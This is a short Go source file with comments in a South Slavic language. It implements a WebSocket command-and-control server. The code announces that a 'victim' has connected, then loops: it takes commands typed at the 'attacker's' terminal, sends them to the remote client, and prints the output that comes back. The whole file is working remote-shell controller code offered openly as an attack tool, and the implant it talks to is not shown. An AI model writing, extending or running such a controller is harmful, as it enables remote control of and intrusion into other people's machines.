package main

import (
	"fmt"
	"log"
	"net/http"

	"github.com/gorilla/websocket"
)

var upgrader = websocket.Upgrader{
	ReadBufferSize:  1024,
	WriteBufferSize: 1024,
}

func handleConnection(w http.ResponseWriter, r *http.Request) {
	// Nadogradnja HTTP konekcije na WebSocket
	conn, err := upgrader.Upgrade(w, r, nil)
	if err != nil {
		log.Println("Greška pri nadogradnji:", err)
		return
	}
	defer conn.Close()

	fmt.Println("Žrtva je povezana!")

	// Glavna petlja za komande
	for {
		// Uzimanje komande iz terminala napadača
		var cmd string
		fmt.Print("Unesi komandu: ")
		fmt.Scanln(&cmd)

		// Slanje komande klijentu
		err = conn.WriteMessage(websocket.TextMessage, []byte(cmd))
		if err != nil {
			log.Println("Greška pri pisanju:", err)
			return
		}

		// Prijem izlaza od klijenta
		_, message, err := conn.ReadMessage()
		if err != nil {
			log.Println("Greška pri čitanju:", err)
			return
		}
		fmt.Println("Izlaz:", string(message))
	}
}

func main() {
	// Postavljanje WebSocket tačke
	http.HandleFunc("/ws", handleConnection)

	// Pokretanje servera
	fmt.Println("Server osluškuje na :8080...")
	err := http.ListenAndServe(":8080", nil)
	if err != nil {
		log.Fatal("Greška pri osluškivanju:", err)
	}
}
